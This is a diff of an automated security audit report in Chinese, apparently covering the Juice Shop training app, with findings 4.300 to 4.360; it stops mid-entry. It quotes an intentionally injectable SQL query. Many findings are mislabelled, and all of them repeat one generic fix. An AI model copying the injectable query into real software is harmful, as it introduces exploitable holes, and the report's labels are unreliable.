+  <pre><code>models.sequelize.query(`SELECT * FROM Products WHERE ((name LIKE &#39;%${criteria}%&#39; OR description LIKE &#39;%${criteria}%&#39;) AND deletedAt IS NULL) ORDER BY name`) // vuln-code-snippet vuln-line unionSqlInje</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.300 Path Traversal <span class="badge medium">MEDIUM</span></h3>
+  <p class="meta">
+    routes/vulnCodeSnippet.ts:90　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>const codingChallengeInfos = yaml.load(await fs.readFile(&#39;./data/static/codefixes/&#39; + key + &#39;.info.yml&#39;, { encoding: &#39;utf8&#39; }))</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.301 detect-replaceall-sanitization <span class="badge low">LOW</span></h3>
+  <p class="meta">
+    C:\Users\52697\Desktop\2026小学期\AuditAgentX\data\projects\proj_27e19404\data\static\codefixes\restfulXssChallenge_2.ts:46　
+    来源 semgrep　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>requires login</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.302 unsafe-formatstring <span class="badge low">LOW</span></h3>
+  <p class="meta">
+    C:\Users\52697\Desktop\2026小学期\AuditAgentX\data\projects\proj_27e19404\server.ts:157　
+    来源 semgrep　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>requires login</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.303 XSS <span class="badge low">LOW</span></h3>
+  <p class="meta">
+    Gruntfile.js:31　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>archive: &#39;dist/&lt;%= pkg.name %&gt;-&lt;%= pkg.version %&gt;&#39; + (node ? (&#39;_node&#39; + node) : &#39;&#39;) + (os ? (&#39;_&#39; + os) : &#39;&#39;) + (platform ? (&#39;_&#39; + platform) : &#39;&#39;) + (os === &#39;linux&#39; ? &#39;.tgz&#39; : &#39;.zip&#39;)</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.304 XSS <span class="badge low">LOW</span></h3>
+  <p class="meta">
+    Gruntfile.js:63　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>dest: &#39;juice-shop_&lt;%= pkg.version %&gt;/&#39;</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.305 Path Traversal <span class="badge low">LOW</span></h3>
+  <p class="meta">
+    data/staticData.ts:9　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>return await readFile(filePath, &#39;utf8&#39;)</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.306 Path Traversal <span class="badge low">LOW</span></h3>
+  <p class="meta">
+    data/static/codefixes/nftUnlockChallenge_1.sol:27　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>require(from == address(0) || to == address(0), &#34;Err: token transfer is BLOCKED&#34;);</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.307 Path Traversal <span class="badge low">LOW</span></h3>
+  <p class="meta">
+    frontend/src/app/accounting/accounting.component.ts:130　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>this.snackBarHelperService.open(`Quantity for ${product.name} has been updated.`, &#39;confirmBar&#39;)</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.308 Path Traversal <span class="badge low">LOW</span></h3>
+  <p class="meta">
+    frontend/src/app/accounting/accounting.component.ts:144　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>this.snackBarHelperService.open(`Price for ${product.name} has been updated.`, &#39;confirmBar&#39;)</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.309 Path Traversal <span class="badge low">LOW</span></h3>
+  <p class="meta">
+    frontend/src/app/complaint/complaint.component.spec.ts:134　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>component.uploader.queue[0] = new FileItem(component.uploader, new File([&#39;&#39;], &#39;file.pdf&#39;, { type: &#39;application/pdf&#39; }), { url: &#39;&#39; })</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.310 Path Traversal <span class="badge low">LOW</span></h3>
+  <p class="meta">
+    frontend/src/app/navbar/navbar.component.ts:258　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>const snackBarRef = this.snackBar.open(`Language has been changed to ${language.lang}`, &#39;Force page reload&#39;, {</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.311 Path Traversal <span class="badge low">LOW</span></h3>
+  <p class="meta">
+    frontend/src/app/order-completion/order-completion.component.ts:98　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>window.open(redirectUrl, &#39;_blank&#39;)</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.312 Path Traversal <span class="badge low">LOW</span></h3>
+  <p class="meta">
+    frontend/src/app/order-history/order-history.component.ts:115　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>window.open(redirectUrl, &#39;_blank&#39;)</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.313 XSS <span class="badge low">LOW</span></h3>
+  <p class="meta">
+    frontend/src/app/score-board/components/challenge-card/challenge-card.component.spec.ts:242　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>expect(compiled.querySelector(&#39;.description-row&#39;)?.innerHTML).toContain(&#39;&lt;b&gt;boom&lt;/b&gt;&#39;)</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.314 SSRF <span class="badge low">LOW</span></h3>
+  <p class="meta">
+    frontend/src/app/Services/address.service.ts:26　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>return this.http.get(`${this.host}/${id}`).pipe(map((response: any) =&gt; response.data), catchError((err: Error) =&gt; { throw err }))</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.315 SSRF <span class="badge low">LOW</span></h3>
+  <p class="meta">
+    frontend/src/app/Services/address.service.ts:30　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>return this.http.post(this.host + &#39;/&#39;, params).pipe(map((response: any) =&gt; response.data), catchError((err) =&gt; { throw err }))</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.316 SSRF <span class="badge low">LOW</span></h3>
+  <p class="meta">
+    frontend/src/app/Services/administration.service.ts:21　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>return this.http.get(this.host + &#39;/application-version&#39;).pipe(</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.317 SSRF <span class="badge low">LOW</span></h3>
+  <p class="meta">
+    frontend/src/app/Services/basket.service.ts:36　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>return this.http.get(`${this.hostServer}/rest/basket/${id}`).pipe(map((response: any) =&gt; response.data), catchError((error) =&gt; { throw error }))</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.318 SSRF <span class="badge low">LOW</span></h3>
+  <p class="meta">
+    frontend/src/app/Services/basket.service.ts:40　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>return this.http.get(`${this.host}/${id}`).pipe(map((response: any) =&gt; response.data), catchError((error) =&gt; { throw error }))</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.319 SSRF <span class="badge low">LOW</span></h3>
+  <p class="meta">
+    frontend/src/app/Services/basket.service.ts:52　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>return this.http.post(this.host + &#39;/&#39;, params).pipe(map((response: any) =&gt; response.data), catchError((error) =&gt; { throw error }))</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.320 SSRF <span class="badge low">LOW</span></h3>
+  <p class="meta">
+    frontend/src/app/Services/basket.service.ts:56　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>return this.http.post(`${this.hostServer}/rest/basket/${id}/checkout`, { couponData, orderDetails }).pipe(map((response: any) =&gt; response.orderConfirmation), catchError((error) =&gt; { throw error }))</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.321 SSRF <span class="badge low">LOW</span></h3>
+  <p class="meta">
+    frontend/src/app/Services/captcha.service.ts:21　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>return this.http.get(this.host + &#39;/&#39;).pipe(catchError((err) =&gt; { throw err }))</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.322 SSRF <span class="badge low">LOW</span></h3>
+  <p class="meta">
+    frontend/src/app/Services/challenge.service.ts:23　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>return this.http.get(this.host + &#39;/&#39;, { params }).pipe(map((response: any) =&gt; response.data), catchError((err) =&gt; { throw err }))</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.323 SSRF <span class="badge low">LOW</span></h3>
+  <p class="meta">
+    frontend/src/app/Services/challenge.service.ts:27　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>return this.http.get(this.hostServer + &#39;/rest/repeat-notification&#39;, { params: { challenge: challengeName }, responseType: &#39;text&#39; as const }).pipe(catchError((err) =&gt; { throw err }))</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.324 SSRF <span class="badge low">LOW</span></h3>
+  <p class="meta">
+    frontend/src/app/Services/challenge.service.ts:31　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>return this.http.get(this.hostServer + &#39;/rest/continue-code&#39;).pipe(map((response: any) =&gt; response.continueCode), catchError((err) =&gt; { throw err }))</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.325 SSRF <span class="badge low">LOW</span></h3>
+  <p class="meta">
+    frontend/src/app/Services/challenge.service.ts:35　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>return this.http.get(this.hostServer + &#39;/rest/continue-code-findIt&#39;).pipe(map((response: any) =&gt; response.continueCode), catchError((err) =&gt; { throw err }))</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.326 SSRF <span class="badge low">LOW</span></h3>
+  <p class="meta">
+    frontend/src/app/Services/challenge.service.ts:39　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>return this.http.get(this.hostServer + &#39;/rest/continue-code-fixIt&#39;).pipe(map((response: any) =&gt; response.continueCode), catchError((err) =&gt; { throw err }))</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.327 SSRF <span class="badge low">LOW</span></h3>
+  <p class="meta">
+    frontend/src/app/Services/code-fixes.service.ts:29　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>return this.http.get(this.host + `/${key}`).pipe(map((response: Fixes) =&gt; response), catchError((error: any) =&gt; { throw error }))</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.328 SSRF <span class="badge low">LOW</span></h3>
+  <p class="meta">
+    frontend/src/app/Services/complaint.service.ts:21　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>return this.http.post(this.host + &#39;/&#39;, params).pipe(map((response: any) =&gt; response.data), catchError((err) =&gt; { throw err }))</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.329 SSRF <span class="badge low">LOW</span></h3>
+  <p class="meta">
+    frontend/src/app/Services/country-mapping.service.ts:20　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>return this.http.get(this.hostServer + &#39;/rest/country-mapping&#39;).pipe(catchError((err) =&gt; { throw err }))</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.330 SSRF <span class="badge low">LOW</span></h3>
+  <p class="meta">
+    frontend/src/app/Services/data-subject.service.ts:22　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>return this.http.post(this.host + &#39;/erasure-request&#39;, params).pipe(catchError((error: Error) =&gt; { throw error })</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.331 SSRF <span class="badge low">LOW</span></h3>
+  <p class="meta">
+    frontend/src/app/Services/data-subject.service.ts:27　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>return this.http.post(this.host + &#39;/data-export&#39;, params).pipe(catchError((err) =&gt; { throw err }))</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.332 SSRF <span class="badge low">LOW</span></h3>
+  <p class="meta">
+    frontend/src/app/Services/delivery.service.ts:37　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>return this.http.get(`${this.host}/${id}`).pipe(map((response: DeliverySingleMethodResponse) =&gt; response.data), catchError((err) =&gt; { throw err }))</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.333 SSRF <span class="badge low">LOW</span></h3>
+  <p class="meta">
+    frontend/src/app/Services/feedback.service.ts:21　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>return this.http.get(this.host + &#39;/&#39;, {</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.334 SSRF <span class="badge low">LOW</span></h3>
+  <p class="meta">
+    frontend/src/app/Services/feedback.service.ts:27　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>return this.http.post(this.host + &#39;/&#39;, params).pipe(map((response: any) =&gt; response.data), catchError((err) =&gt; { throw err }))</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.335 SSRF <span class="badge low">LOW</span></h3>
+  <p class="meta">
+    frontend/src/app/Services/hint.service.ts:23　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>return this.http.get(this.host + &#39;/&#39;).pipe(map((response: any) =&gt; response.data), catchError((err) =&gt; { throw err }))</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.336 SSRF <span class="badge low">LOW</span></h3>
+  <p class="meta">
+    frontend/src/app/Services/image-captcha.service.ts:20　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>return this.http.get(this.hostServer + &#39;/rest/image-captcha/&#39;).pipe(catchError((err) =&gt; { throw err }))</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.337 SSRF <span class="badge low">LOW</span></h3>
+  <p class="meta">
+    frontend/src/app/Services/keys.service.ts:16　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>return this.http.get(this.host + &#39;/nftUnlocked&#39;).pipe(</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.338 SSRF <span class="badge low">LOW</span></h3>
+  <p class="meta">
+    frontend/src/app/Services/keys.service.ts:25　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>return this.http.get(this.host + &#39;/nftMintListen&#39;).pipe(</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.339 SSRF <span class="badge low">LOW</span></h3>
+  <p class="meta">
+    frontend/src/app/Services/keys.service.ts:34　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>return this.http.get(this.hostServer + &#39;/api/Challenges/?key=nftMintChallenge&#39;).pipe(</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.340 SSRF <span class="badge low">LOW</span></h3>
+  <p class="meta">
+    frontend/src/app/Services/keys.service.ts:45　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>return this.http.post(endpoint, params).pipe(</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.341 SSRF <span class="badge low">LOW</span></h3>
+  <p class="meta">
+    frontend/src/app/Services/keys.service.ts:56　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>return this.http.post(endpoint, params).pipe(</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.342 SSRF <span class="badge low">LOW</span></h3>
+  <p class="meta">
+    frontend/src/app/Services/keys.service.ts:67　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>return this.http.post(endpoint, params).pipe(</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.343 SSRF <span class="badge low">LOW</span></h3>
+  <p class="meta">
+    frontend/src/app/Services/languages.service.ts:20　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>return this.http.get(`${this.hostServer}/rest/languages`).pipe(catchError((err) =&gt; { throw err }))</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.344 Path Traversal <span class="badge low">LOW</span></h3>
+  <p class="meta">
+    frontend/src/app/Services/local-backup.service.ts:76　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>const snackBarRef = this.snackBar.open(&#39;Backup has been restored from &#39; + backupFile.name, &#39;Apply changes now&#39;, {</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.345 Path Traversal <span class="badge low">LOW</span></h3>
+  <p class="meta">
+    frontend/src/app/Services/local-backup.service.ts:92　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>this.snackBarHelperService.open(`Version ${backup.version} is incompatible with expected version ${this.VERSION}`, &#39;errorBar&#39;)</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.346 Path Traversal <span class="badge low">LOW</span></h3>
+  <p class="meta">
+    frontend/src/app/Services/local-backup.service.ts:95　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>this.snackBarHelperService.open(`Backup restore operation failed: ${err.message}`, &#39;errorBar&#39;)</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.347 SSRF <span class="badge low">LOW</span></h3>
+  <p class="meta">
+    frontend/src/app/Services/order-history.service.ts:25　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>return this.http.get(this.host + &#39;/orders&#39;).pipe(map((response: any) =&gt; response.data), catchError((err) =&gt; { throw err }))</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.348 SSRF <span class="badge low">LOW</span></h3>
+  <p class="meta">
+    frontend/src/app/Services/payment.service.ts:26　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>return this.http.get(`${this.host}/${id}`).pipe(map((response: any) =&gt; response.data), catchError((err: Error) =&gt; { throw err }))</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.349 SSRF <span class="badge low">LOW</span></h3>
+  <p class="meta">
+    frontend/src/app/Services/payment.service.ts:30　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>return this.http.post(this.host + &#39;/&#39;, params).pipe(map((response: any) =&gt; response.data), catchError((err) =&gt; { throw err }))</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.350 SSRF <span class="badge low">LOW</span></h3>
+  <p class="meta">
+    frontend/src/app/Services/photo-wall.service.ts:28　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>return this.http.get(this.host + &#39;/&#39;).pipe(map((response: any) =&gt; response.data), catchError((err: Error) =&gt; { throw err }))</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.351 SSRF <span class="badge low">LOW</span></h3>
+  <p class="meta">
+    frontend/src/app/Services/product-review.service.ts:21　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>return this.http.get(`${this.host}/${id}/reviews`).pipe(</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.352 SSRF <span class="badge low">LOW</span></h3>
+  <p class="meta">
+    frontend/src/app/Services/product-review.service.ts:39　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>return this.http.post(this.host + &#39;/reviews&#39;, { id: _id }).pipe(map((response: any) =&gt; response.data), catchError((err) =&gt; { throw err }))</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.353 SSRF <span class="badge low">LOW</span></h3>
+  <p class="meta">
+    frontend/src/app/Services/product.service.ts:21　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>return this.http.get(`${this.hostServer}/rest/products/search?q=${criteria}`).pipe(map((response: any) =&gt; response.data), catchError((err) =&gt; { throw err }))</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.354 SSRF <span class="badge low">LOW</span></h3>
+  <p class="meta">
+    frontend/src/app/Services/product.service.ts:25　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>return this.http.get(this.host + &#39;/&#39;, { params }).pipe(map((response: any) =&gt; response.data), catchError((err) =&gt; { throw err }))</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.355 SSRF <span class="badge low">LOW</span></h3>
+  <p class="meta">
+    frontend/src/app/Services/product.service.ts:29　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>return this.http.get(`${this.host}/${id}?d=${encodeURIComponent(new Date().toDateString())}`).pipe(map((response: any) =&gt;</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.356 SSRF <span class="badge low">LOW</span></h3>
+  <p class="meta">
+    frontend/src/app/Services/quantity.service.ts:21　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>return this.http.get(this.host + &#39;/&#39;).pipe(map((response: any) =&gt; response.data), catchError((err) =&gt; { throw err }))</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.357 SSRF <span class="badge low">LOW</span></h3>
+  <p class="meta">
+    frontend/src/app/Services/recycle.service.ts:21　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>return this.http.get(this.host + &#39;/&#39;, {</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.358 SSRF <span class="badge low">LOW</span></h3>
+  <p class="meta">
+    frontend/src/app/Services/recycle.service.ts:27　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>return this.http.post(this.host + &#39;/&#39;, params).pipe(map((response: any) =&gt; response.data), catchError((error) =&gt; { throw error }))</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.359 SSRF <span class="badge low">LOW</span></h3>
+  <p class="meta">
+    frontend/src/app/Services/security-answer.service.ts:21　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>return this.http.post(this.host + &#39;/&#39;, params).pipe(</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.360 SSRF <span class="badge low">LOW</span></h3>
+  <p class="meta">
